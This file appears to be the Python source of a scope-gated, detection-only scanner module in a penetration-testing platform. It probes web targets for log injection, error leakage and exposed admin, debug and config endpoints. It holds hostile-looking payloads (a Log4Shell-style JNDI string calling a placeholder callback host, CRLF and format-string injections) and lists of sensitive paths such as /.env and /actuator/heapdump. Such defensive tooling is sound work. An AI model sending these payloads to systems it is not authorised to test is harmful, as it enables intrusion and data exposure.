from __future__ import annotations

import json
import re
from dataclasses import dataclass
from hashlib import sha256
from typing import Any
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

import httpx as httpx_client

from api.app.services.runs import web_target_value_is_allowed_with_path
from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution
from workers.runners.httpx.runner import normalize_http_target

LOGGING_PROBE_RESULTS_ARTIFACT_NAME = "logging-probe-results.json"
DEFAULT_TIMEOUT_SECONDS = 5.0
MAX_RESPONSE_BYTES = 16_384
DEFAULT_ADMIN_PATHS = (
    "/admin",
    "/management",
    "/actuator",
    "/debug",
    "/console",
    "/phpinfo.php",
    "/server-status",
)
DEFAULT_ACTUATOR_PATHS = (
    "/actuator/env",
    "/actuator/heapdump",
    "/actuator/mappings",
)
DEFAULT_DEBUG_PATHS = (
    "/_debug",
    "/debug/vars",
    "/debug/pprof",
    "/.env",
    "/config.json",
    "/config.yml",
)
DEFAULT_ERROR_PATHS = (
    "/__aegispt_error_probe__",
)
LOG_INJECTION_PAYLOADS = (
    {
        "probe_type": "crlf",
        "payload": "aegispt-log\r\nAegisPT-Log-Probe: injected",
        "title": "Log Injection Possible",
    },
    {
        "probe_type": "format-string",
        "payload": "aegispt-log-%s-%n",
        "title": "Log Injection Possible",
    },
    {
        "probe_type": "log4shell-pattern",
        "payload": "${jndi:ldap://callback/a}",
        "title": "Log4Shell-Style Injection Pattern Accepted",
    },
)
PRIVATE_IP_PATTERN = re.compile(
    r"\b(?:10\.(?:\d{1,3}\.){2}\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3})\b"
)
INTERNAL_PATH_PATTERN = re.compile(
    r"(?i)(?:/[a-z0-9_.-]+){2,}/[a-z0-9_.-]+\.(?:py|php|rb|java|js|ts|go|cs|yml|yaml|conf|ini)|[a-z]:\\[^\s<>\"']+"
)
SECRET_ASSIGNMENT_PATTERN = re.compile(
    r"(?i)\b([a-z0-9_.-]*(?:password|passwd|secret|token|api[_-]?key|access[_-]?key|private[_-]?key)[a-z0-9_.-]*)\b\s*[:=]\s*([^\s,;\"'<>{}]+)"
)
ERROR_SIGNAL_PATTERNS = (
    (
        "stack_trace",
        re.compile(
            r"(?is)(traceback \(most recent call last\)|stack trace:|exception in thread|^\s*at\s+[\w.$]+\(|"
            r"java\.lang\.[a-z]+exception|django\.core|flask\.app|werkzeug\.exceptions|"
            r"ruby on rails|activerecord::|php fatal error|node\.js|express error|asp\.net)",
            re.MULTILINE,
        ),
    ),
    (
        "database_error",
        re.compile(
            r"(?is)(sql syntax|mysql_fetch|mysqli?_|postgres(?:ql)? error|psycopg2|sqlite3\."
            r"|ora-\d{5}|jdbc exception|mongo(error|exception)|sequelize(?:database)?error)",
        ),
    ),
    (
        "framework_debug",
        re.compile(
            r"(?is)(spring boot|springframework|laravel|symfony|django debug|debug toolbar|werkzeug debugger|"
            r"rails environment|express stack|x-aspnet-version|x-powered-by)",
        ),
    ),
)


@dataclass(frozen=True, slots=True)
class RecordedResponse:
    status_code: int
    headers: dict[str, str]
    body: bytes
    request_url: str

    @property
    def text(self) -> str:
        return self.body.decode("utf-8", errors="replace")


def _json_artifact(
    name: str,
    payload: dict[str, Any],
    *,
    kind: str = "runner-results",
) -> EvidenceArtifact:
    return EvidenceArtifact(
        name=name,
        content_type="application/json",
        data=(json.dumps(payload, sort_keys=True) + "\n").encode("utf-8"),
        kind=kind,
    )


def _bounded_timeout(timeout_seconds: float | int | None) -> float:
    try:
        value = float(timeout_seconds if timeout_seconds is not None else DEFAULT_TIMEOUT_SECONDS)
    except (TypeError, ValueError):
        value = DEFAULT_TIMEOUT_SECONDS
    if value <= 0:
        raise ValueError("timeout_seconds must be greater than zero")
    return min(value, DEFAULT_TIMEOUT_SECONDS)


def _allowed(scope_allowlist: dict[str, Any] | None, url: str) -> bool:
    return web_target_value_is_allowed_with_path(scope_allowlist or {}, url)


def _assert_allowed(scope_allowlist: dict[str, Any] | None, url: str) -> None:
    if not _allowed(scope_allowlist, url):
        raise ValueError(f"target outside approved logging probe web scope: {url}")


def _normalize_targets(targets: list[str], scope_allowlist: dict[str, Any] | None) -> list[str]:
    normalized: list[str] = []
    seen: set[str] = set()
    for target in targets:
        candidate = normalize_http_target(str(target or "").strip())
        if not candidate:
            continue
        _assert_allowed(scope_allowlist, candidate)
        if candidate not in seen:
            seen.add(candidate)
            normalized.append(candidate)
    if not normalized:
        raise ValueError("at least one target is required")
    return normalized


def _origin(url: str) -> str:
    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"


def _candidate_url(base_url: str, raw_path: str) -> str | None:
    value = str(raw_path or "").strip()
    if not value:
        return None
    try:
        if "://" in value:
            return normalize_http_target(value)
        if value.startswith("/"):
            return normalize_http_target(urljoin(_origin(base_url), value))
        return normalize_http_target(urljoin(base_url, value))
    except ValueError:
        return None


def _dedupe(items: list[str]) -> list[str]:
    deduped: list[str] = []
    seen: set[str] = set()
    for item in items:
        value = str(item or "").strip()
        if not value or value in seen:
            continue
        seen.add(value)
        deduped.append(value)
    return deduped


def _target_paths(
    base_url: str,
    *,
    scope_allowlist: dict[str, Any] | None,
    raw_paths: list[str],
) -> tuple[list[str], list[dict[str, Any]]]:
    urls: list[str] = []
    skipped: list[dict[str, Any]] = []
    seen: set[str] = set()
    for raw_path in raw_paths:
        candidate = _candidate_url(base_url, raw_path)
        if not candidate:
            continue
        if not _allowed(scope_allowlist, candidate):
            skipped.append(
                {
                    "path": raw_path,
                    "target": candidate,
                    "reason": "outside-approved-web-path-scope",
                }
            )
            continue
        if candidate not in seen:
            seen.add(candidate)
            urls.append(candidate)
    return urls, skipped


def _headers_for_request(extra_headers: dict[str, str] | None = None) -> dict[str, str]:
    headers = {
        "User-Agent": "AegisPT/logging-probe detection-only",
        "Accept": "text/html,application/json,text/plain,*/*;q=0.5",
        "Range": f"bytes=0-{MAX_RESPONSE_BYTES - 1}",
    }
    if extra_headers:
        headers.update(extra_headers)
    return headers


def _record_response(
    client: httpx_client.Client,
    method: str,
    url: str,
    *,
    params: dict[str, str] | None = None,
    content: str | bytes | None = None,
    headers: dict[str, str] | None = None,
) -> RecordedResponse:
    with client.stream(
        method,
        url,
        params=params,
        content=content,
        headers=_headers_for_request(headers),
        follow_redirects=False,
    ) as response:
        chunks: list[bytes] = []
        total = 0
        for chunk in response.iter_bytes():
            if not chunk:
                continue
            remaining = MAX_RESPONSE_BYTES - total
            if remaining <= 0:
                break
            chunks.append(chunk[:remaining])
            total += len(chunk[:remaining])
            if total >= MAX_RESPONSE_BYTES:
                break
        return RecordedResponse(
            status_code=response.status_code,
            headers={str(key): str(value) for key, value in response.headers.items()},
            body=b"".join(chunks),
            request_url=str(response.request.url),
        )


def _response_hash(response: RecordedResponse) -> str:
    return sha256(response.body).hexdigest()


def _headers_text(headers: dict[str, str]) -> str:
    return "\n".join(f"{name}: {value}" for name, value in sorted(headers.items()))


def _redact_sensitive_values(text: str) -> str:
    return SECRET_ASSIGNMENT_PATTERN.sub(lambda match: f"{match.group(1)}=<redacted>", text)


def _body_excerpt(response: RecordedResponse) -> str:
    text = _redact_sensitive_values(response.text)
    return re.sub(r"\s+", " ", text).strip()[:500]


def _append_finding(
    findings: list[dict[str, Any]],
    seen: set[tuple[str, str, str]],
    *,
    title: str,
    finding_type: str,
    severity: str,
    target: str,
    summary: str,
    evidence: dict[str, Any],
    control_family: str = "error_handling",
    tags: list[str] | None = None,
) -> None:
    evidence_key = str(
        evidence.get("probe_type")
        or evidence.get("path")
        or evidence.get("url")
        or evidence.get("signal_types")
        or ""
    )
    key = (title, target, evidence_key)
    if key in seen:
        return
    seen.add(key)
    methodology_tags = [
        "owasp-a09-security-logging-monitoring-failures",
        "logging-probe-validation",
        *(tags or []),
    ]
    findings.append(
        {
            "type": finding_type,
            "title": title,
            "severity": severity,
            "target": target,
            "summary": summary,
            "confirmed": True,
            "methodology_tags": methodology_tags,
            "control_family": control_family,
            "evidence": evidence,
            "replay_recipe": {
                "tool": "logging-probe",
                "target": target,
                "scope": "approved-web-root-only",
                "jndi_callback_listener_started": False,
                "jndi_exploitation_attempted": False,
                "admin_panel_login_attempted": False,
                "debug_endpoint_chaining_attempted": False,
                "log_file_read_attempted": False,
            },
        }
    )


def _error_signals(response: RecordedResponse) -> list[dict[str, str]]:
    evidence_text = f"{response.text}\n{_headers_text(response.headers)}"
    signals: list[dict[str, str]] = []
    for signal_type, pattern in ERROR_SIGNAL_PATTERNS:
        match = pattern.search(evidence_text)
        if match:
            signals.append({"signal_type": signal_type, "matched": _redact_sensitive_values(match.group(0))[:160]})
    path_match = INTERNAL_PATH_PATTERN.search(evidence_text)
    if path_match:
        signals.append({"signal_type": "internal_file_path", "matched": _redact_sensitive_values(path_match.group(0))[:160]})
    ip_match = PRIVATE_IP_PATTERN.search(evidence_text)
    if ip_match:
        signals.append({"signal_type": "internal_ip_disclosure", "matched": ip_match.group(0)})
    return signals


def _query_url(url: str, name: str, value: str) -> str:
    parsed = urlparse(url)
    query = parse_qsl(parsed.query, keep_blank_values=True)
    query.append((name, value))
    return urlunparse(
        (
            parsed.scheme,
            parsed.netloc,
            parsed.path or "/",
            parsed.params,
            urlencode(query, doseq=True),
            parsed.fragment,
        )
    )


def _path_from_url(url: str) -> str:
    return urlparse(url).path or "/"


def _path_kind(path: str) -> str:
    if path.startswith("/actuator/") or path == "/actuator":
        return "spring-actuator"
    if path in {"/.env", "/config.json", "/config.yml"}:
        return "configuration-file"
    if path.startswith("/debug") or path == "/_debug":
        return "debug"
    return "admin"


def _endpoint_signals(path: str, response: RecordedResponse) -> list[str]:
    text = response.text.lower()
    content_type = response.headers.get("content-type", "").lower()
    signals: list[str] = []
    if path.startswith("/actuator/") or path == "/actuator":
        if response.status_code == 200 and (
            "propertysources" in text
            or "spring" in text
            or "heapdump" in path
            or "mappings" in text
            or "application/vnd.spring-boot.actuator" in content_type
        ):
            signals.append("spring-actuator-exposed")
    if path in {"/.env", "/config.json", "/config.yml"} and response.status_code == 200:
        if SECRET_ASSIGNMENT_PATTERN.search(response.text) or any(
            marker in text for marker in ("db_", "database", "spring.datasource", "jwt", "secret")
        ):
            signals.append("configuration-file-exposed")
    if path == "/phpinfo.php" and response.status_code == 200 and ("phpinfo()" in text or "php version" in text):
        signals.append("phpinfo-exposed")
    if path == "/server-status" and response.status_code == 200 and "server status" in text:
        signals.append("server-status-exposed")
    if path in {"/debug", "/_debug", "/debug/vars", "/debug/pprof", "/console"} and response.status_code == 200:
        if any(marker in text for marker in ("debug", "pprof", "cmdline", "goroutine", "console", "vars")):
            signals.append("debug-endpoint-exposed")
    if path in {"/admin", "/management"} and response.status_code == 200:
        if any(marker in text for marker in ("admin", "management", "dashboard", "login", "console")):
            signals.append("admin-endpoint-exposed")
    return signals


def _endpoint_finding_title(path_kind: str, signals: list[str]) -> tuple[str, str, str]:
    if path_kind == "spring-actuator":
        return (
            "Spring Actuator Endpoint Exposed",
            "spring_actuator_exposure",
            "high",
        )
    if path_kind == "configuration-file":
        return (
            "Debug Configuration File Exposed",
            "debug_configuration_exposure",
            "high",
        )
    if "debug-endpoint-exposed" in signals:
        return (
            "Exposed Debug Endpoint",
            "debug_endpoint_exposure",
            "medium",
        )
    return (
        "Exposed Admin or Management Endpoint",
        "admin_endpoint_exposure",
        "medium",
    )


def _payload_reflected(response: RecordedResponse, payload: str) -> dict[str, Any]:
    text = response.text
    headers = _headers_text(response.headers)
    encoded = urlencode({"x": payload}).split("=", 1)[1]
    return {
        "in_body": payload in text,
        "in_headers": payload in headers,
        "url_encoded_in_headers": encoded in headers,
    }


def _analyze_error_probe(
    *,
    findings: list[dict[str, Any]],
    seen: set[tuple[str, str, str]],
    check: dict[str, Any],
    response: RecordedResponse,
) -> None:
    signals = _error_signals(response)
    check["signals"] = signals
    if not signals:
        return
    signal_types = sorted({signal["signal_type"] for signal in signals})
    _append_finding(
        findings,
        seen,
        title="Error Information Disclosure - Stack Trace/Internal Path Exposed",
        finding_type="error_information_disclosure",
        severity="high",
        target=check["target"],
        summary="An error-handling probe returned stack trace, internal path, database, framework, or internal network details.",
        evidence={
            "probe_type": check["probe_type"],
            "method": check["method"],
            "url": check["target"],
            "status_code": response.status_code,
            "signal_types": signal_types,
            "signals": signals[:8],
            "response_excerpt": _body_excerpt(response),
            "response_sha256": _response_hash(response),
        },
        tags=["error-information-disclosure"],
    )


def execute_logging_probe(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    admin_paths: list[str] | None = None,
    actuator_paths: list[str] | None = None,
    debug_paths: list[str] | None = None,
    error_paths: list[str] | None = None,
    timeout_seconds: float | int | None = None,
) -> RunnerExecution:
    normalized_targets = _normalize_targets(targets, scope_allowlist)
    timeout = _bounded_timeout(timeout_seconds)
    checks: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str, str]] = set()
    skipped_targets: list[dict[str, Any]] = []

    configured_admin_paths = _dedupe([*DEFAULT_ADMIN_PATHS, *(admin_paths or [])])
    configured_actuator_paths = _dedupe([*DEFAULT_ACTUATOR_PATHS, *(actuator_paths or [])])
    configured_debug_paths = _dedupe([*DEFAULT_DEBUG_PATHS, *(debug_paths or [])])
    configured_error_paths = _dedupe([*DEFAULT_ERROR_PATHS, *(error_paths or [])])

    with httpx_client.Client(timeout=timeout) as client:
        for target in normalized_targets:
            error_urls, skipped = _target_paths(
                target,
                scope_allowlist=scope_allowlist,
                raw_paths=configured_error_paths,
            )
            skipped_targets.extend(skipped)
            error_probe_urls = _dedupe([target, *error_urls])
            for url in error_probe_urls:
                query_url = _query_url(url, "aegispt_error_probe", "'\"))")
                check = {
                    "check_type": "error_leakage_probe",
                    "probe_type": "malformed-query",
                    "method": "GET",
                    "target": query_url,
                    "safe_detection_only": True,
                }
                try:
                    response = _record_response(client, "GET", query_url)
                    check.update(
                        {
                            "status_code": response.status_code,
                            "response_sha256": _response_hash(response),
                            "response_excerpt": _body_excerpt(response),
                        }
                    )
                    _analyze_error_probe(
                        findings=findings,
                        seen=seen,
                        check=check,
                        response=response,
                    )
                except httpx_client.HTTPError as exc:
                    check["error"] = str(exc)
                checks.append(check)

            invalid_json_check = {
                "check_type": "error_leakage_probe",
                "probe_type": "invalid-json",
                "method": "POST",
                "target": target,
                "safe_detection_only": True,
            }
            try:
                response = _record_response(
                    client,
                    "POST",
                    target,
                    content='{"aegispt_logging_probe":',
                    headers={"Content-Type": "application/json"},
                )
                invalid_json_check.update(
                    {
                        "status_code": response.status_code,
                        "response_sha256": _response_hash(response),
                        "response_excerpt": _body_excerpt(response),
                    }
                )
                _analyze_error_probe(
                    findings=findings,
                    seen=seen,
                    check=invalid_json_check,
                    response=response,
                )
            except httpx_client.HTTPError as exc:
                invalid_json_check["error"] = str(exc)
            checks.append(invalid_json_check)

            path_urls, skipped = _target_paths(
                target,
                scope_allowlist=scope_allowlist,
                raw_paths=[*configured_admin_paths, *configured_actuator_paths, *configured_debug_paths],
            )
            skipped_targets.extend(skipped)
            for url in path_urls:
                path = _path_from_url(url)
                check = {
                    "check_type": "admin_debug_path_probe",
                    "probe_type": _path_kind(path),
                    "method": "GET",
                    "target": url,
                    "safe_detection_only": True,
                    "range_header_used": True,
                }
                try:
                    response = _record_response(client, "GET", url)
                    signals = _endpoint_signals(path, response)
                    check.update(
                        {
                            "status_code": response.status_code,
                            "signals": signals,
                            "response_sha256": _response_hash(response),
                            "response_excerpt": _body_excerpt(response),
                        }
                    )
                    if signals:
                        title, finding_type, severity = _endpoint_finding_title(_path_kind(path), signals)
                        _append_finding(
                            findings,
                            seen,
                            title=title,
                            finding_type=finding_type,
                            severity=severity,
                            target=url,
                            summary="A common admin, management, debug, actuator, or configuration endpoint returned exposed diagnostic content.",
                            evidence={
                                "path": path,
                                "url": url,
                                "status_code": response.status_code,
                                "signals": signals,
                                "response_excerpt": _body_excerpt(response),
                                "response_sha256": _response_hash(response),
                                "range_header_used": True,
                            },
                            control_family="configuration",
                            tags=["admin-debug-exposure"],
                        )
                except httpx_client.HTTPError as exc:
                    check["error"] = str(exc)
                checks.append(check)

            for payload_def in LOG_INJECTION_PAYLOADS:
                payload = str(payload_def["payload"])
                probe_type = str(payload_def["probe_type"])
                probe_url = _query_url(target, "aegispt_log_probe", payload)
                check = {
                    "check_type": "log_injection_reflection_probe",
                    "probe_type": probe_type,
                    "method": "GET",
                    "target": probe_url,
                    "payload_sha256": sha256(payload.encode("utf-8")).hexdigest(),
                    "safe_detection_only": True,
                    "oob_callback_listener_started": False,
                }
                try:
                    response = _record_response(client, "GET", probe_url)
                    reflection = _payload_reflected(response, payload)
                    check.update(
                        {
                            "status_code": response.status_code,
                            "reflection": reflection,
                            "response_sha256": _response_hash(response),
                            "response_excerpt": _body_excerpt(response),
                        }
                    )
                    if any(reflection.values()):
                        is_log4shell = probe_type == "log4shell-pattern"
                        _append_finding(
                            findings,
                            seen,
                            title=str(payload_def["title"]),
                            finding_type="log4shell_pattern_accepted" if is_log4shell else "log_injection_possible",
                            severity="high" if is_log4shell else "medium",
                            target=target,
                            summary=(
                                "The application reflected a Log4Shell-style JNDI marker without sanitization; "
                                "no callback chain or exploitation was attempted."
                                if is_log4shell
                                else "The application reflected CRLF or log-format marker input without sanitization."
                            ),
                            evidence={
                                "probe_type": probe_type,
                                "url": probe_url,
                                "status_code": response.status_code,
                                "payload_sha256": check["payload_sha256"],
                                "reflection": reflection,
                                "response_excerpt": _body_excerpt(response),
                                "response_sha256": _response_hash(response),
                                "jndi_exploitation_attempted": False,
                                "callback_chain_attempted": False,
                            },
                            tags=["log-injection"],
                        )
                except httpx_client.HTTPError as exc:
                    check["error"] = str(exc)
                checks.append(check)

    payload = {
        "tool": "logging-probe",
        "summary": {
            "target_count": len(normalized_targets),
            "check_count": len(checks),
            "finding_count": len(findings),
            "skipped_out_of_scope_path_count": len(skipped_targets),
        },
        "targets": normalized_targets,
        "checks": checks,
        "findings": findings,
        "skipped_targets": skipped_targets,
        "safety": {
            "approval_gated": True,
            "runtime_self_modification": False,
            "error_and_path_probing_only": True,
            "follow_redirects": False,
            "max_timeout_seconds": DEFAULT_TIMEOUT_SECONDS,
            "max_response_bytes": MAX_RESPONSE_BYTES,
            "range_header_used_for_path_probes": True,
            "jndi_callback_listener_started": False,
            "jndi_exploitation_attempted": False,
            "callback_chain_attempted": False,
            "admin_panel_login_attempted": False,
            "debug_endpoint_chaining_attempted": False,
            "heapdump_full_download_attempted": False,
            "log_file_read_attempted": False,
            "credentials_used": False,
        },
    }
    return RunnerExecution(
        tool="logging-probe",
        exit_code=0,
        stdout=json.dumps(
            {
                "target_count": len(normalized_targets),
                "check_count": len(checks),
                "finding_count": len(findings),
            },
            sort_keys=True,
        ),
        stderr="",
        metadata={
            "target_count": len(normalized_targets),
            "check_count": len(checks),
            "finding_count": len(findings),
            "safety": payload["safety"],
        },
        artifacts=[_json_artifact(LOGGING_PROBE_RESULTS_ARTIFACT_NAME, payload)],
    )
